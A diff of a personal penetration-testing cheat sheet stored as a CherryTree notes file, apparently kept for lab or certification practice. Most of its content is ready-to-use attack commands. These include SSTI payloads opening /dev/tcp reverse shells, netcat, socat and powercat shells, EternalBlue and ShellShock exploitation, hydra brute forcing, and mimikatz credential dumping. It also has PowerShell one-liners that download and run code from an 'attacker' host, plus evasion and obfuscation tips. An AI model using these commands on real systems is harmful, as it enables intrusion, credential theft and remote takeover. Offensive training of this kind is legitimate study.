@@ -1,10 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1643622334">
+  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1646134082">
     <rich_text>Close port
 sudo kill $(sudo lsof -t -i:445)</rich_text>
-    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1643486307">
+    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1646596169">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Automate actions inside services</rich_text>
+      <rich_text>
+
+Logging &amp; listing e-mails on POP3
+• for user in $(cat users); do (echo user ${user}; sleep 2s; echo pass &lt;pass&gt;; sleep 2s; echo list; sleep 2s; echo quit) | nc -nvC &lt;target&gt; 110; done
+
+
+</rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Port Scanning</rich_text>
       <rich_text>
 
@@ -17,7 +25,7 @@ sudo kill $(sudo lsof -t -i:445)</rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Nmap</rich_text>
       <rich_text>
 
-ls /usr/share/nmap/scripts/ | grep ‘&lt;desired_script/service&gt;’
+ls /usr/share/nmap/scripts/ | grep '&lt;desired_script/service&gt;'
 
 
 </rich_text>
@@ -47,6 +55,9 @@ ls /usr/share/nmap/scripts/ | grep ‘&lt;desired_script/service&gt;’
 
 </rich_text>
       <rich_text weight="heavy">Agressive Enumeration</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text underline="single" style="italic">RUN THE BASIC COMMAND FIRST!</rich_text>
       <rich_text>
 • wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive
 
@@ -115,33 +126,40 @@ traceroute &lt;ip&gt; -m 5 -T</rich_text>
       <rich_text weight="heavy">
 </rich_text>
       <rich_text>
+
 </rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SNMP</rich_text>
       <rich_text>
 
-</rich_text>
-      <rich_text weight="heavy">Brute-force Communities</rich_text>
-      <rich_text>
-onesixtyone -c &lt;wordlist&gt; -p 161 &lt;host&gt;
+Nmap
+• nmap -sU -p 161 --script=snmp-win32-services &lt;host&gt;
+• nmap -sU -p 161 &lt;host&gt; --script snmp-brute (/usr/share/nmap/nselib/data/snmpcommunities.lst) 
+• --script-args snmp-brute.communitiesdb=&lt;wordlist&gt;
 
-</rich_text>
-      <rich_text weight="heavy">Enumerate Windows Users</rich_text>
-      <rich_text>
-snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 10.10.10.5 1.3.6.1.4.1.77.1.2.25
+Brute-force communities
+• onesixtyone -c &lt;wordlist&gt; -p 161 &lt;host&gt;
+• -i for multiple hosts
 
-nmap -sU -p 161 --script=snmp-win32-services &lt;host&gt;
+Windows users
+• snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 1.3.6.1.4.1.77.1.2.25
 
-nmap -sU -p 161 &lt;host&gt; --script snmp-brute (/usr/share/nmap/nselib/data/snmpcommunities.lst)
---script-args snmp-brute.communitiesdb=&lt;wordlist&gt;
+Running Windows processes
+• snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 1.3.6.1.2.1.25.4.2.1.2
 
-</rich_text>
-      <rich_text weight="heavy">List software installed on the machine</rich_text>
-      <rich_text>
-snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
+Open TCP ports
+• snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 1.3.6.1.2.1.6.13.1.3
+
+Installed software
+• snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 1.3.6.1.2.1.25.6.3.1.2
+• snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
+
 
 </rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SMB</rich_text>
       <rich_text>
+
+SambaCry
+• sudo nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 &lt;host&gt;
 
 nmap -sC --script=smb-enum-users 192.168.201.14
 nmap --script smb-os-discovery -p 445 &lt;ip_address&gt;
@@ -160,21 +178,29 @@ pass &lt;pass&gt;
 list
 retr &lt;email id&gt;
 
+
 </rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">UDP</rich_text>
       <rich_text>
 nmap -vv — reason -Pn -sU -A — top-ports=20 — version-all
 
+
 </rich_text>
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SQL</rich_text>
       <rich_text>
+
 </rich_text>
       <rich_text weight="heavy">Connect and enumerate databases</rich_text>
       <rich_text>
 mysql -h 192.168.201.11 -u root -p
 
 </rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">MSSQL</rich_text>
+      <rich_text weight="heavy">MySQL enumeration</rich_text>
+      <rich_text>
+• nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
+
+</rich_text>
+      <rich_text weight="heavy">MSSQL</rich_text>
       <rich_text>
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=fooadmin,mssql.password=fooadmin,ms-sql-xp-cmdshell.cmd="whoami" 172.16.64.199
 
@@ -183,28 +209,29 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=fooadmin,m
       <rich_text>
 update users set adm="yes" where username="tracking1";
 
+
 </rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">RPCbind</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">RPC/NFS</rich_text>
       <rich_text>
 
-nmap --script rpc-grind,rpcinfo &lt;ip_address&gt; -p 111
-
-rpcinfo -p &lt;host&gt;
+• nmap -p 111 --script nfs* &lt;ip&gt;
+• nmap --script rpc-grind,rpcinfo &lt;ip_address&gt; -p 111
+• rpcinfo -p &lt;host&gt;
 
 # showmount -e 192.168.201.8
 Export list for 192.168.201.8:
 /home/vulnix *
 
-mount -t nfs 192.168.201.8:/home /share
+• mount -o nolock &lt;ip&gt;:&lt;share&gt; &lt;destiny&gt;
+• mount -o nolock -t nfs 192.168.201.8:/home /tmp/share
+
+In case of mounting a share locally and facing user permission limitations, add a new user with the UUID
+• sudo adduser &lt;user&gt;
+• sed -i -e 's/&lt;current_uuid&gt;/&lt;desired_uuid&gt;/g' /etc/passwd
+
 
 </rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">NFS</rich_text>
-      <rich_text>
-
-nmap -sSUV -p 2049 &lt;ip_address&gt;
-
-</rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Crunch</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Crunch</rich_text>
       <rich_text>
 
 Generating from a specific pattern
@@ -214,87 +241,10 @@ crunch 13 13 -t bev,%%@@^1995 -o bigtom
 @ lowercase
 , uppercase
 % numbers
-^ special chars
-
-</rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Hydra</rich_text>
-      <rich_text>
-
-• POP3: hydra -L &lt;USER LIST&gt; -P &lt;PASS LIST&gt; -t20 &lt;HOST&gt; -s&lt;PORT&gt; -I pop3
-
-• hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed"
-
-</rich_text>
-      <rich_text weight="heavy">Brute-forcing Subdomains</rich_text>
-      <rich_text>
-wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "</rich_text>
-      <rich_text link="webs http://cmess.thm/">http://cmess.thm/</rich_text>
-      <rich_text>" -H "Host: FUZZ.cmess.thm" --hw 290
-</rich_text>
-      <rich_text weight="heavy">
-Brute-force a single param</rich_text>
-      <rich_text>
-hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&amp;Login=Login:invalid key" -f
-
-</rich_text>
+^ special chars</rich_text>
     </node>
-    <node name="Exploitation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344165" ts_lastsave="1642766817">
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Buffer Overflows</rich_text>
-      <rich_text>
-
-bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-
-</rich_text>
-      <rich_text weight="heavy">Spiking</rich_text>
-      <rich_text>
-# trun.spk 
-s_readline(); 
-s_string("TRUN "); 
-s_string_variable("0;) 
-
-generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
-
-
-</rich_text>
-      <rich_text weight="heavy">Generate pattern</rich_text>
-      <rich_text>
-• /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1000
-
-</rich_text>
-      <rich_text weight="heavy">Get the offset</rich_text>
-      <rich_text>
-• /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1000 -q &lt;ACCESS VIOLATION&gt;
-• !mona findmsp
-
-• The manual way is to send bytes and overwrite EIP. Use A's and B's in order to diferentiate
-</rich_text>
-      <rich_text style="italic">• To reach EIP you increase 4 bytes after the Offset.</rich_text>
-      <rich_text>
-
-</rich_text>
-      <rich_text weight="heavy">Fuzz for badchars</rich_text>
-      <rich_text>
-• buffer = "A" * &lt;offset&gt; + "BBBB" + bad
-
-</rich_text>
-      <rich_text weight="heavy">Identify the Return Address</rich_text>
-      <rich_text>
-
-• Look for JMP ESP on the binary or a DLL without ASLR
-• !mona jmp -r esp -cpb "&lt;badchars&gt;"
-• !mona find -s "\xff\xe4"
-
-</rich_text>
-      <rich_text weight="heavy">Generate ShellCode</rich_text>
-      <rich_text>
-• msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=X -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
-• msfvenom -p linux/x86/shell_reverse_tcp LHOST=X LPORT=X EXITFUNC=thread -b "\x00" -f python -v payload</rich_text>
-      <rich_text justification="center" style="italic">
-</rich_text>
-      <rich_text>
-
-</rich_text>
-      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SSTI</rich_text>
+    <node name="Exploitation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344165" ts_lastsave="1646261558">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SSTI</rich_text>
       <rich_text>
 
 • {% import os %}{{os.system('bash -c "bash -i &gt;&amp; /dev/tcp/192.168.201.26/1234 0&gt;&amp;1"')}}
@@ -527,9 +477,111 @@ Upload files
 Executing shell commands
 • SELECT sys_eval ('&lt;command&gt;');
 • SELECT sys_exec('&lt;command&gt;');
-• sqlmap --os-cmd --os-shell</rich_text>
+• sqlmap --os-cmd --os-shell
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Hydra</rich_text>
+      <rich_text>
+
+• POP3: hydra -L &lt;USER LIST&gt; -P &lt;PASS LIST&gt; -t20 &lt;HOST&gt; -s&lt;PORT&gt; -I pop3
+
+• hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed"
+
+</rich_text>
+      <rich_text weight="heavy">Brute-forcing Subdomains</rich_text>
+      <rich_text>
+wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "</rich_text>
+      <rich_text link="webs http://cmess.thm/">http://cmess.thm/</rich_text>
+      <rich_text>" -H "Host: FUZZ.cmess.thm" --hw 290
+</rich_text>
+      <rich_text weight="heavy">
+Brute-force a single param</rich_text>
+      <rich_text>
+hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&amp;Login=Login:invalid key" -f
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Shell</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">NetCat</rich_text>
+      <rich_text>
+
+Bind
+• nc -lnvp &lt;port&gt; -e cmd.exe (compromised)
+• nc -nv &lt;ip&gt; &lt;port&gt; (attacker)
+
+Reverse
+• nc -lnvp &lt;port&gt; (compromised)
+• nc -nv &lt;ip&gt; &lt;port&gt; -e /bin/bash (attacker)
+
+</rich_text>
+      <rich_text weight="heavy">Socat</rich_text>
+      <rich_text>
+
+Reverse (Linux attacker)
+• sudo socat TCP4-LISTEN:443 STDOUT (attacker)
+• socat - TCP4:&lt;ip&gt;:&lt;port&gt; (compromised)
+
+Reverse (Windows attacker)
+• socat -d -d TCP4-LISTEN:443 STDOUT (compromised)
+• socat TCP4:&lt;ip&gt;:&lt;port&gt; EXEC:/bin/bash (attacker)
+
+Encrypted Bind
+
+Generate certificate
+• openssl req -newkey rsa:4028 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+Linux Listener
+• sudo socat OPENSSL-LISTEN:443,cert=&lt;cert_file&gt;,verify=0,fork EXEC:/bin/bash
+Connect back
+• socat - OPENSSL:&lt;ip&gt;:&lt;port&gt;,verify=0
+
+</rich_text>
+      <rich_text weight="heavy">Powercat</rich_text>
+      <rich_text>
+
+Reverse
+• powercat -c &lt;ip&gt; -p &lt;port&gt; -e cmd.exe
+
+Bind
+• powercat -l -p &lt;port&gt; -e cmd.exe
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">EternalBlue</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text link="webs https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</rich_text>
+      <rich_text>
+
+Generate shellcode
+• msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=443 EXITFUNC=thread -f exe -a x86 --platform -o ms17-010.exe
+
+Start listener
+• nc -lnvp 443
+
+Run exploit
+• python send_and_execute.py &lt;target&gt; ms17-010.exe
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">ShellShock</rich_text>
+      <rich_text>
+
+Identification
+• gobuster dir -u &lt;target&gt; -w &lt;wordlist&gt; http://target/cgi-bin/ -x .cgi
+
+Exploitation
+• curl -H 'User-Agent: () { :; }; echo "[+] Vulnerable!" bash -c id' http://target/cgi-bin/file.cgi
+• curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaa; &lt;PAYLOAD&gt;; echo zzzz'" http://target/cgi-bin/admin.cgi
+
+</rich_text>
     </node>
-    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1643025052">
+    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1645209164">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SQL Related</rich_text>
       <rich_text>
 
@@ -539,6 +591,11 @@ Executing shell commands
 update &lt;table&gt;
 set &lt;item&gt;='new_content' where &lt;item&gt;='item';
 set pwd='admin' where login='admin';
+
+</rich_text>
+      <rich_text weight="heavy">Update encrypted password</rich_text>
+      <rich_text>
+• update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin';
 
 </rich_text>
       <rich_text weight="heavy">Add items to table</rich_text>
@@ -552,7 +609,7 @@ set pwd='admin' where login='admin';
 
 </rich_text>
       <rich_text weight="heavy">Proxychains</rich_text>
-      <rich_text>
+      <rich_text> 
 
 • Copy the /etc/proxychains.conf file to the current directory to preserve the original file
 • Comment the </rich_text>
@@ -793,7 +850,7 @@ Decode &amp; Extract
 • </rich_text>
       <rich_text foreground="#e8e6e3">fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt </rich_text>
       <rich_text>file.zip</rich_text>
-      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1643713434">
+      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1647023912">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">General</rich_text>
         <rich_text>
 
@@ -805,14 +862,30 @@ On services.msc
 • Properties -&gt; Startup type: Automatic
 • Apply &amp; Start the service
 
-Enable service port on firewall
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Firewall</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">List/manipulate current firewall rules</rich_text>
+        <rich_text>
+• netsh advfirewall show allprofiles
+• netsh advfirewall set allprofiles state on/off
+
+</rich_text>
+        <rich_text weight="heavy">Check port state</rich_text>
+        <rich_text>
+• netsh firewall show state | findstr &lt;port&gt;
+
+</rich_text>
+        <rich_text weight="heavy">Enable service port on firewall</rich_text>
+        <rich_text>
 • netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
 
 </rich_text>
-        <rich_text weight="heavy">Firewall</rich_text>
+        <rich_text weight="heavy">Allow service port</rich_text>
         <rich_text>
-
-Allow service port
 • netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
 
 </rich_text>
@@ -902,9 +975,24 @@ Enable the service
 • run getgui -e
 • reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-
 • xfreerdp "/v:&lt;HOST&gt;" "/u:&lt;USER&gt;" /drive:tmp,/tmp
 • Remmina: Share Folder
+
+</rich_text>
+        <rich_text weight="heavy">Socat</rich_text>
+        <rich_text>
+
+Linux to Windows
+• sudo socat TCP4-LISTEN:443,fork file:&lt;file&gt;
+• socat TCP4:&lt;ip&gt;:&lt;port&gt; file:&lt;file&gt;,create
+
+</rich_text>
+        <rich_text weight="heavy">Powercat</rich_text>
+        <rich_text>
+
+Windows to Linux
+• sudo nc -lnvp 443 &gt; receiving_powercat.ps1
+• powercat -c &lt;ip&gt; -p &lt;port&gt; -i C:\path\powercat.ps1
 
 
 </rich_text>
@@ -1007,6 +1095,7 @@ Grant permissions
 Dump
 • sekurlsa::logonPasswords full
 • lsadump::sam
+• 
 
 </rich_text>
         <rich_text weight="heavy">SessionGopher</rich_text>
@@ -1065,7 +1154,31 @@ Test credentials
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Evil-WinRM</rich_text>
         <rich_text>
 
-• evil-winrm -i &lt;domain&gt; -u &lt;user&gt; -p '&lt;password&gt;'</rich_text>
+• evil-winrm -i &lt;domain&gt; -u &lt;user&gt; -p '&lt;password&gt;'
+
+
+</rich_text>
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Bypassing UAC</rich_text>
+        <rich_text>
+
+ProcMon Filters
+• Process Name is
+• Result is NAME NOT FOUND
+• Path contains &lt;format&gt;
+   ◇ In the compmgmtlauncher for example, is msc
+
+Steps
+• UAC must be set to default, if it's set to Always Notify forget it
+• Look for Windows utilities or programs that has the autoElevate proprety set to true, which allows the executable to auto-elevate itself to a high integrity process
+• Look for HKCU entries
+• Add the entry with a malicious payload and execute the utility
+
+Vulnerable software
+• compmgmtlauncher.exe
+
+Powershell Exploit for compmgmtlauncher
+
+</rich_text>
       </node>
       <node name="Linux" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394471" ts_lastsave="1643225954">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Restricted Shells</rich_text>
@@ -1243,7 +1356,7 @@ On the attacker machine, just connect back to the target:
 • curl http://&lt;attacker_ip&gt;:8000/file -o file &amp;&amp; chmod</rich_text>
       </node>
     </node>
-    <node name="Privilege Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344338" ts_lastsave="1639344356">
+    <node name="Privilege escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344338" ts_lastsave="1644085407">
       <node name="Windows" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344356" ts_lastsave="1642110834">
         <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Useful commands</rich_text>
         <rich_text>
@@ -1442,8 +1555,9 @@ Spawn a command prompt
 List any saved credentials
 • cmdkey /list</rich_text>
       </node>
-      <node name="Linux" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344352" ts_lastsave="1643303203">
-        <rich_text weight="heavy">Good for guidance</rich_text>
+      <node name="Linux" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344352" ts_lastsave="1646909726">
+        <rich_text>Good</rich_text>
+        <rich_text weight="heavy"> for guidance</rich_text>
         <rich_text>
 </rich_text>
         <rich_text link="webs https://tryhackme.com/room/linuxprivescarena">https://tryhackme.com/room/linuxprivescarena</rich_text>
@@ -1535,7 +1649,7 @@ List any saved credentials
 </rich_text>
         <rich_text weight="heavy">World-writeable</rich_text>
         <rich_text>
-• find -perm -2 -type f 2&gt;/dev/null
+• find / -perm -2 -type f 2&gt;/dev/null
 
 </rich_text>
         <rich_text weight="heavy">Conf files</rich_text>
@@ -1785,7 +1899,7 @@ Reverse TCP
 
 • msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;$LOCAL_IP&gt; LPORT=&lt;$LOCAL_PORT&gt; -f raw -o shell.php</rich_text>
     </node>
-    <node name="Powershell" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643622334" ts_lastsave="1643715930">
+    <node name="Powershell" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643622334" ts_lastsave="1646050280">
       <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">General</rich_text>
       <rich_text>
 
@@ -1923,76 +2037,138 @@ List process methods
 • Get-Process | Get-Member -MemberType Method
 
 Using methods against processes
-• Get-Process -Name "&lt;process&gt;" | &lt;method&gt;</rich_text>
-      <node name="One-liners" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643713463" ts_lastsave="1643714916">
+• Get-Process -Name "&lt;process&gt;" | &lt;method&gt;
+
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Download &amp; Execution</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Disk-based</rich_text>
+      <rich_text>
+
+• iex (New-Object System.Net.Webclient).downloader.DownloadFile("</rich_text>
+      <rich_text link="webs http://attacker:8000/xpl.exe&quot;,&quot;C:\xpl.exe&quot;)">http://attacker:8000/xpl.exe","C:\xpl.exe")</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">In-memory</rich_text>
+      <rich_text>
+
+• iex (New-Object Net.Webclient).DownloadString("</rich_text>
+      <rich_text link="webs http://attacker:8000/script.ps1&quot;)">http://attacker:8000/script.ps1")</rich_text>
+      <rich_text>
+• powershell iex (New-Object Net.Webclient),DownloadString('</rich_text>
+      <rich_text link="webs http://attacker:8000/script.ps1')">http://attacker:8000/script.ps1')</rich_text>
+      <rich_text>
+
+• $req = [System.Net.WebRequest]::Create("</rich_text>
+      <rich_text link="webs http://attacker:8000/script.ps1&quot;)">http://attacker:8000/script.ps1")</rich_text>
+      <rich_text>
+res = $req.GetResponse()
+iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()
+
+
+&lt;?xml version="1.0"?&gt;
+&lt;command&gt;
+	&lt;a&gt;
+		&lt;execute&gt;Get-Process&lt;/execute&gt;
+	&lt;/a&gt;
+	&lt;/command&gt;
+
+• $xmldoc = New-Object SystemXml.XmlDocument
+$xmldoc.Load("</rich_text>
+      <rich_text link="webs http://attacker:8000/file.xml&quot;)">http://attacker:8000/file.xml")</rich_text>
+      <rich_text>
+iex $xmldoc.command.a.execute
+
+
+</rich_text>
+      <rich_text weight="heavy">Evasion tips</rich_text>
+      <rich_text>
+
+• Have a SSL certificate configured on the attacker machine to download files through HTTPs
+• Use a different extension, it should be executed normally
+
+Using custom user-agent strings
+
+• downloader.Headers.Add("user-agent", "&lt;agent&gt;")
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Obfuscation</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Invoke-Obfuscation</rich_text>
+      <rich_text>
+
+Set scriptblock to obfuscate
+• SET SCRIPTBLOCK &lt;commands&gt;
+
+Tips
+• Use RESET to clear previous encodings
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Powercat</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Stand-alone payloads</rich_text>
+      <rich_text>
+
+Reverse shell
+• powercat -c &lt;ip&gt; -p &lt;port&gt; -e cmd.exe -g &gt; reverse.ps1
+
+Base64 encoded
+• powercat -c &lt;ip&gt; -p &lt;port&gt; -e cmd.exe -ge &gt; encodedrev.ps1
+• powershell.exe -E &lt;encoded_script&gt;</rich_text>
+      <node name="One-liners" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643713463" ts_lastsave="1646515707">
         <rich_text weight="heavy">Port Scanner</rich_text>
         <rich_text>
+• $ports=(22,80,8000); $ip="localhost"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null){}else{Write-Host "[+] Port"$port" open"; $socket = $null;}}
 
-$ports=(22,80,8000); $ip="localhost"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null){}else{Write-Host "[+] Port"$port" open"; $socket = $null;}}
 
 </rich_text>
+        <rich_text weight="heavy">Domain Enumeration</rich_text>
+        <rich_text>
+• </rich_text>
+        <rich_text foreground="#e8e6e3">powershell "IEX (New-Object Net.WebClient).DownloadString('http://attacker:8000/PowerView.ps1'); Get-NetDomainController"</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text weight="heavy">Windows Reverse Shell</rich_text>
+        <rich_text>
